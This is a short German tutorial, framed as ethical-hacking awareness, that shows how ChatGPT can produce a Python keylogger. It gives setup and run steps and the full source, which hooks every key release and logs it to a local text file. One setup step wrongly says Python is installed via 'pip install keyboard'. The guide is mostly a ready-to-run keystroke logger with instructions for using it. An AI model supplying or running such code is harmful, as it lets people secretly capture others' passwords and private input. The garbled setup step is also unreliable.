Disclaimer:
Diese Anleitung ist ausschließlich für ethical Hacking und dient zur Prevention, sowie für Aufklärungs- & Bildungszwecke !
Zudem ist die Anleitung, sowie das python-Skript verantwortungsbewusst und nur für legale Zwecke zu nutzen.
Die Nutzung der Anleitung ist auf eigene Gefahr, denn der Autor übernimmt keine Garantie für die Richtigkeit der Anleitung und haftet nicht für entstandene Schäden.


Intention dieser Anleitung ist es, zu demonstrieren wie einfach es sein kann, mithilfe von KI schädliche Software zu generieren und diese zu nutzen.

Da jedoch auf die Verlässlichkeit sowie Richtigkeit von Code der mit Chat GPT erstellt wurde, kein Verlass ist, empfielt es sich den Code gründlich zu prüfen und nur in einer gesicherten Test-Umgebung auszuführen.


Aufklärung über (Python) Keylogger !


Diese Anleitung wurde auf Windows 10 getestet.
Visual Studuio Code Version 1.81.1
Chat GPT Version 3.5


Das Keylogger-Skript wurde mit ChatGPT erstellt !



Schritt 1:

a) "Visual Studio Code" von Microsoft herunterladen und installieren.
https://code.visualstudio.com


b) Python Erweiterung installieren (auf offizielle Version von Micrsoft achten, wird durch einen Verifikationshaken gekennzeichnet !)

c) Überprüfen, ob Python installiert ist, wenn nicht mit dem Befehl "pip install keyboard" installieren.

d) Keylogger-Code kopieren und Einfügen.

e) Speichern.




Schritt 2:

a) Terminal (in Visual Studio Code) öffnen.

b) Im Terminal zum Ordner navigieren in der die .py Datei gespeichert ist.

c) Python Ausführen mit: "python _name_der_py_Datei.py"



Nun werden alle Tasten aufgezeichnet und in einer Text-Datei gespeichert. 
Diese wird standartmäßig in dem gleichen Pfad gespeichert, wo auch die .py Datei gespeichert ist.


Zum Stoppen des Skriptes:
Im Terminal einfach "STRG C" drücken.


Python-Skript das mithilfe von Chat GPT erstellt wurde:


import keyboard

def main():
    with open('tastenlog.txt', 'w') as f:
        f.write("Gedrückte Tasten:\n")
        
    keyboard.on_release(callback)

    try:
        keyboard.wait()
    except KeyboardInterrupt:
        pass
    finally:
        keyboard.unhook_all()

def callback(event):
    with open('tastenlog.txt', 'a') as f:
        f.write(event.name + '\n')

if __name__ == "__main__":
    main()


